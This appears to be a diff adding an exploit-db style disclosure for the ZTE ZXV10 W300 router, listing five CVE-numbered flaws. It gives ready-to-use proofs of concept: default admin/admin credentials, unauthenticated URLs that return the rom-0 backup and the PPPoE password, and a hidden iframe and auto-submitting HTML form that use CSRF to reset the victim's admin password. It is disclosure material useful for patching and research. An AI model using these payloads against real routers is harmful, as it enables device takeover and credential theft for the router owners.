@@ -1,0 +1,78 @@
+# Exploit Title: 	ZTE WXV10 W300 Multiple Vulnerabilities
+# Date: 			17-05-2014
+# Server Version: 	RomPager/4.07 UPnP/1.0
+# Tested Routers:   ZTE ZXV10 W300
+# Firmware: 		W300V1.0.0a_ZRD_LK
+# ADSL Firmware: 	FwVer:3.11.2.175_TC3086 HwVer:T14.F7_5.0
+# Tested on: 		Kali Linux x86_64
+# Exploit Author: 	Osanda Malith Jayathissa (@OsandaMalith)
+# Original write-up:https://osandamalith.wordpress.com/2014/06/10/zte-and-tp-link-rompager-dos/
+
+
+#1| Default Password Being Used (CVE-2014-4018)
+------------------------------------------------
+In ZTE routers the username is a constant which is "admin" and the password by default is "admin"
+
+#2| ROM-0 Backup File Disclosure (CVE-2014-4019)
+-------------------------------------------------
+The rom-0 backup file contains sensitive information such as the router password. 
+There is a disclosure in which anyone can download that file without any authentication by a simple GET request.
+
+POC:
+http://192.168.1.1/rom-0
+
+You can find the router password using my rom-0 configuration decompressor.  
+http://packetstormsecurity.com/files/127049/ZTE-TP-Link-ZynOS-Huawei-rom-0-Configuration-Decompressor.html
+
+#3| PPPoE/PPPoA Password Disclosure in tc2wanfun.js (CVE-2014-4154)
+---------------------------------------------------------------------
+If you look at the frame source in the "Internet" tab under the "Interface Setup" you can see this doLoad function in line 542 which fetches the password and displays it there. The frame URI is /basic/home_wan.htm.
+
+function doLoad() {
+	var value = document.forms[0].wanTypeRadio[2].checked;
+	doEnable();
+	QosCheck();
+	WANChkIdleTimeT();
+	if (value)
+	pppStaticCheck();
+	LockWhenPVC0();
+	LockPVC();
+	if(document.forms[0].wan_PPPPassword != null)
+	{
+		document.forms[0].wan_PPPPassword.value = pwdppp;
+	}
+}
+
+The "pwdpp" is loaded from an external file which you can see at the bottom of the page.
+<script language="javascript" src="/basic/tc2wanfun.js"></script>
+Once the user authenticates the router till another successful restart the password is written in that external JS file.
+
+POC:
+http://192.168.1.1/basic/tc2wanfun.js
+
+#4| Admin Password Manipulation CSRF (CVE-2014-4155)
+-----------------------------------------------------
+You can change the password to blank by requesting /Forms/tools_admin_1 with a GET requesting containing HTTP basic authentication.
+POC:
+<iframe src="http://192.168.1.1/Forms/tools_admin_1" width="0" height="0"></iframe>
+If you send something like above to the victim, he will be prompted for the login and once he enter his credentials, his password will be immediately changed to a blank password.
+Ofcourse since there is no XSRF token in the request you change the password as you wish.
+POC:
+<html>
+  <body>
+    <form name="exploit" action="http://192.168.1.1/Forms/tools_admin_1" method="POST">
+      <input type="hidden" name="uiViewTools_Password" value="your_passwd" />
+      <input type="hidden" name="uiViewTools_PasswordConfirm" value="your_passwd" />
+      <script>document.exploit.submit(); </script>
+    </form>
+  </body>
+</html>
+
+#5| Denial of Service
+-----------------------
+You can see my previous post about this vulnerability and the exploit.
+
+https://osandamalith.wordpress.com/2014/06/10/zte-and-tp-link-rompager-dos/
+http://www.osvdb.org/show/osvdb/108076
+http://packetstormsecurity.com/files/127076/ZTE-TP-Link-RomPager-Denial-Of-Service.html
+http://www.exploit-db.com/exploits/33737
